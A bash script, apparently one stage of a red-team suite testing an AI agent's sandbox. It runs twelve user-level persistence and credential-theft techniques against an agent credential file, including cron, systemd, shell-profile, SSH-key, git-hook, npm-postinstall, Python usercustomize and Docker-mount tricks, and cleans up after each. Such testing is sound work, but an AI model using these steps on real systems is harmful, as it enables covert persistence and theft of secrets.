#!/usr/bin/env bash
# Red Lobster v7 — Flag 13: CHAIN — Persistence + exfil combos
# NO sudo. User-level only.
set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/redlobster-lib.sh"

rl_init_flag "flag13" "Flag 13: CHAIN — Persistence & multi-step attacks"

CRED="/home/openclaw/.openclaw/agents/main/agent/auth-profiles.json"
OUTDIR="$FLAG_DIR"

# 1. crontab persistence
rl_run "crontab persistence" \
  "echo '* * * * * cat $CRED > /tmp/rl7_cron.txt' | crontab - 2>/dev/null; sleep 1; crontab -r 2>/dev/null"

# 2. systemd user service
rl_run "systemd user service" \
  "mkdir -p ~/.config/systemd/user; cat > ~/.config/systemd/user/rl7.service <<EOF
[Unit]
Description=RL7 Test
[Service]
Type=oneshot
ExecStart=/bin/cat $CRED
EOF
systemctl --user daemon-reload 2>/dev/null; sleep 1; rm -f ~/.config/systemd/user/rl7.service; systemctl --user daemon-reload 2>/dev/null"

# 3. systemd user timer
rl_run "systemd user timer" \
  "cat > ~/.config/systemd/user/rl7.timer <<EOF
[Unit]
Description=RL7 Timer
[Timer]
OnCalendar=*:*:00
[Install]
WantedBy=timers.target
EOF
systemctl --user daemon-reload 2>/dev/null; sleep 1; rm -f ~/.config/systemd/user/rl7.timer; systemctl --user daemon-reload 2>/dev/null"

# 4. .bashrc injection
rl_run ".bashrc injection" \
  "echo '# RL7TEST' >> ~/.bashrc; echo 'cat $CRED > /tmp/rl7_bashrc.txt 2>/dev/null' >> ~/.bashrc; sleep 1; sed -i '/RL7TEST/d' ~/.bashrc; sed -i '/rl7_bashrc/d' ~/.bashrc"

# 5. .profile injection
rl_run ".profile injection" \
  "echo '# RL7TEST' >> ~/.profile; echo 'cat $CRED > /tmp/rl7_profile.txt 2>/dev/null' >> ~/.profile; sleep 1; sed -i '/RL7TEST/d' ~/.profile; sed -i '/rl7_profile/d' ~/.profile"

# 6. SSH authorized_keys injection
rl_run "SSH authorized_keys injection" \
  "echo 'ssh-ed25519 AAAAC3FAKE_RL7_KEY attacker@evil' >> ~/.ssh/authorized_keys 2>/dev/null; sleep 1; sed -i '/FAKE_RL7_KEY/d' ~/.ssh/authorized_keys 2>/dev/null"

# 7. git hook
rl_run "git hook persistence" \
  "mkdir -p '$OUTDIR/repo/.git/hooks'; echo '#!/bin/bash' > '$OUTDIR/repo/.git/hooks/post-commit'; echo 'cat $CRED > /tmp/rl7_git.txt' >> '$OUTDIR/repo/.git/hooks/post-commit'; chmod +x '$OUTDIR/repo/.git/hooks/post-commit'; sleep 1; rm -rf '$OUTDIR/repo'"

# 8. npm postinstall hook
rl_run "npm postinstall hook" \
  "mkdir -p '$OUTDIR/npmpkg'; echo '{\"name\":\"rl7\",\"scripts\":{\"postinstall\":\"cat $CRED > /tmp/rl7_npm.txt\"}}' > '$OUTDIR/npmpkg/package.json'; sleep 1; rm -rf '$OUTDIR/npmpkg'"

# 9. Python usercustomize persistence
rl_run "python usercustomize persistence" \
  "PYDIR=\$(python3 -c 'import site; print(site.getusersitepackages())' 2>/dev/null); mkdir -p \"\$PYDIR\" 2>/dev/null; echo 'import os; os.system(\"cat $CRED > /tmp/rl7_pysite.txt 2>/dev/null\")' > \"\$PYDIR/usercustomize.py\" 2>/dev/null; sleep 1; rm -f \"\$PYDIR/usercustomize.py\" 2>/dev/null"

# 10. XDG autostart
rl_run "XDG autostart entry" \
  "mkdir -p ~/.config/autostart; cat > ~/.config/autostart/rl7.desktop <<EOF
[Desktop Entry]
Type=Application
Name=RL7
Exec=/bin/cat $CRED
EOF
sleep 1; rm -f ~/.config/autostart/rl7.desktop"

# 11. at job
rl_run "at job scheduling" \
  "echo 'cat $CRED > /tmp/rl7_at.txt' | at now + 1 minute 2>/dev/null; sleep 1; atq 2>/dev/null | awk '{print \$1}' | xargs -I{} atrm {} 2>/dev/null"

# 12. Docker container exfil (user in docker group = root equivalent)
rl_run "docker container exfil" \
  "docker run --rm -v $CRED:/tmp/cred:ro alpine cat /tmp/cred > $OUTDIR/13_12.txt 2>/dev/null"

rl_summary
rl_cleanup
